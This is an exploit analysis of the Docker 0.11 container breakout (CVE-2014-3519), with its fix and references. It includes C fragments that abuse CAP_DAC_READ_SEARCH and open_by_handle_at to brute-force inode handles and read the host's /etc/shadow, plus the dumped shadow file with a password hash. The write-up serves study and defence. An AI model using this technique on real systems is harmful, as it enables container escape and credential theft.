##Docker 0.11 - VMM-Container Breakout

##category：
container breakout   
local security policy bypass 


##core problem：
The core problem is misconfigured permissions (CAP_DAC_READ_SEARCH) that are granted to the container process, and illustrates how container-level virtualization can be tricky to configure. To be fair, this isn’t necessarily a Docker specific problem (it could be any misconfigured container), and it should also be pointed out that this was fixed in Docker 1.0.0.


##analysis：
Before the 0.11, docker use the blocklist to config  container's capabiluties.  

The function open_by_handle_at()函 has  CAP_DAC_READ_SEARCH capabilities lead to this case.  

More info about CAP_DAC_READ_SEARCH, see [capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html)

CAP_DAC_READ_SEARCH:

    * Bypass file read permission checks and directory read and
      execute permission checks;
    * Invoke open_by_handle_at(2).

If open_by_handle_at has CAP_DAC_READ_SEARCH , he can read any files and directory in the filesystem   

the define [open_by_handle_at](http://man7.org/linux/man-pages/man2/open_by_handle_at.2.html)：

    int open_by_handle_at(int mount_fd, struct file_handle *handle,int flags);

- mount_fd     file descriptor for any object (file,directory, etc.) in the mounted filesystem
- file_handle  the file_handle struct 
- flags   The flags argument is as for open(2).

see [file_handle](http://lxr.free-electrons.com/source/include/linux/fs.h#L877):   


     struct file_handle {
          unsigned int  handle_bytes;   /* Size of f_handle [in, out] */
          int           handle_type;    /* Handle type [out] */
           unsigned char f_handle[0];    /* File identifier (sized by
                                                    caller) [out] */
        };
    

f_handle[0] is eight bit inode in the file_handle 

In most filesystem, the root inode(e.g: /) almost always is 2. and uses that as a base point to traverse the filesystem:


##exp：
we want to cat /etc/shadow:

1: fill the root diretcory info 

    struct my_file_handle root_h = {
            .handle_bytes = 8,
            .handle_type = 1,
            .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
            //set the inode 2
        };

2: 
open a file on the host, get the flle description 

    if ((fd1 = open("/.dockerinit", O_RDONLY)) < 0)
        die("[-] open");

3: 
use the file description, root file info, exec  "cat /ect/shadow"

    if (find_handle(fd1, "/etc/shadow", &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");
 
find the dir：  

        
        if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
            die("[-] open_by_handle_at");
     
        if ((dir = fdopendir(fd)) == NULL)
            die("[-] fdopendir");
        for (;;) {
           
            de = readdir(dir);
            if (!de)
                break;
            fprintf(stderr, "[*] Found %s\n", de->d_name);
            //compare the dirname 
            if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
                fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
                ino = de->d_ino;
                break;
            }
        }
find out  the /etc ，get the /etc'inode number   

try the all inode numbers，find the file: 

        if (de) {
           
            for (uint32_t i = 0; i < 0xffffffff; ++i) {
                outh.handle_bytes = 8;
                outh.handle_type = 1;
                memcpy(outh.f_handle, &ino, sizeof(ino));//get the '/etc''s inode
                memcpy(outh.f_handle + 4, &i, sizeof(i)); //only try the last 4 bit 
                if ((i % (1<<20)) == 0)
                    fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
                if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                    closedir(dir);
                    close(fd);
                    dump_handle(&outh);
                    return find_handle(bfd, path, &outh, oh);
                }
            }
        }

4: read the file data 

        
        if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
            die("[-] open_by_handle");
        memset(buf, 0, sizeof(buf));
        if (read(fd2, buf, sizeof(buf) - 1) < 0)
            die("[-] read");


result:

    root:!:15597:0:99999:7:::
    daemon:*:15597:0:99999:7:::
    bin:*:15597:0:99999:7:::
    sys:*:15597:0:99999:7:::
    sync:*:15597:0:99999:7:::
    games:*:15597:0:99999:7:::
    man:*:15597:0:99999:7:::
    lp:*:15597:0:99999:7:::
    mail:*:15597:0:99999:7:::
    news:*:15597:0:99999:7:::
    uucp:*:15597:0:99999:7:::
    proxy:*:15597:0:99999:7:::
    www-data:*:15597:0:99999:7:::
    backup:*:15597:0:99999:7:::
    list:*:15597:0:99999:7:::
    irc:*:15597:0:99999:7:::
    gnats:*:15597:0:99999:7:::
    nobody:*:15597:0:99999:7:::
    libuuid:!:15597:0:99999:7:::
    syslog:*:15597:0:99999:7:::
    messagebus:*:15597:0:99999:7:::
    ntp:*:15597:0:99999:7:::
    sshd:*:15597:0:99999:7:::
    vagrant:$6$aqzOtgCM$OxgoMP4JoqMJ1U1F3MZPo2iBefDRnRCXSfgIM36E5cfMNcE7GcNtH1P/tTC2QY3sX3BxxJ7r/9ciScIVTa55l0:15597:0:99999:7:::
    vboxadd:!:15597::::::
    statd:*:15597:0:99999:7:::


##poc：  
test [poc](http://stealth.openwall.net/xSports/shocker.c)


##version：
docker version <= 0.11 


##fix bug 
docker official discuss use the whitelist to Genular capabilities, see [Granular capabilities / priviledged whitelist](https://github.com/docker/docker/issues/2080)  

remove the capabilities, see [dockerinit: drop capabilities](https://github.com/docker/docker/pull/3015/files)  


##also see：  
- [CVE-2014-3519](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3519)


##links:
- http://man7.org/linux/man-pages/man2/open_by_handle_at.2.html
- http://man7.org/linux/man-pages/man7/capabilities.7.html
- http://stealth.openwall.net/xSports/shocker.c
- https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3#.80qhbidek
- https://blog.docker.com/2014/06/docker-container-breakout-proof-of-concept-exploit/